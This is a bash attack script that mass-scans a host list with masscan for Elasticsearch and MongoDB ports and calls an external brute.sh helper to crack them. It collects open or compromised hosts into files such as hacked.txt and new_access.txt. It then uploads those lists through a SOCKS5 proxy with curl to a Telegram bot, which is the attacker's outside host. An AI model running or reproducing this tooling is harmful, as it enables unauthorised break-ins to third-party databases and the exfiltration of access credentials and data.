#!/bin/bash

cd /opt/scan &

tgkey=""
chat_id=""
proxy_ip=""
proxy_login=""
proxy_pass=""
proxy_port=""

sp="/-\|"
sc=0
spin() {
   printf "\b${sp:sc++:1}"
   ((sc==${#sp})) && sc=0
}
endspin() {
   printf "\r%s\n" "$@"
}

brute() {
echo "..."
}


#Check parametrs
if [ -n "$2" ]
	then
	echo masscan port:$1 hosts:$2
else
	echo "No parameters found. "
	echo "Usage: ./scan.sh port host(/s)_list Example: ./scan.sh 9200 hostlist.txt OR ./scan.sh 27017 hostlist.txt brute"
	echo "Required: masscan nmap grep awk curl screen"
	exit
fi

#Clear variable for filename
out=$( echo $2 | sed 's/\///g' | sed 's/\,//g' | sed 's/\.//g' )

#backup outfile if same targets
mv -f $out.out $out.out_`date +%s`

#clean outfile
echo "" > $out.out 

#Scan targets in background

masscan -p $1 -iL $2 -oG $out.out &

sleep 300

while ps -aux | grep masscan | grep -v "grep" | awk {'print $2'}
do
	./brute.sh $1 $out.out 
done

#check after masscan stopped
while grep -qEo '([0-9]*\.){3}[0-9]*' $out.out
do

        ./brute.sh $1 $out.out
done



#send resilts - hosts without passwords on access

if [[ $(find ./ -name elastic.txt -type f -size +1 2>/dev/null) ]];

        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@elastic.txt -F "chat_id=$chat_id"
 
fi


if [[ $(find ./ -name mongodb.txt -type f -size +1 2>/dev/null) ]];


        then  curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@mongodb.txt -F "chat_id=$chat_id"


fi

#backup output files

mv -f mongodb_secured.txt mongodb_secured.txt_`date +%s`
mv -f mongodb.txt mongodb.txt_`date +%s`
mv -f elastic_secured.txt elastic_secured.txt_`date +%s`
mv -f elastic.txt elastic.txt_`date +%s`
mv -f hacked_mongo.txt hacked_mongo.txt_`date +%s`
mv -f hacked.txt hacked.txt_`date +%s`


grep -v "#" hacked.txt | tail > ./new_access.txt

if ! ps -aux | grep hydra  | grep -v "grep" | awk {'print $2'}

	then curl -v --socks5 $proxy_ip:$proxy_port -U $proxy_login:$proxy_pass -s --max-time 10 --retry 5 --retry-delay 2 --retry-max-time 10 https://api.telegram.org/bot$tgkey/sendDocument -F document=@new_access.txt -F "chat_id=$chat_id"

fi

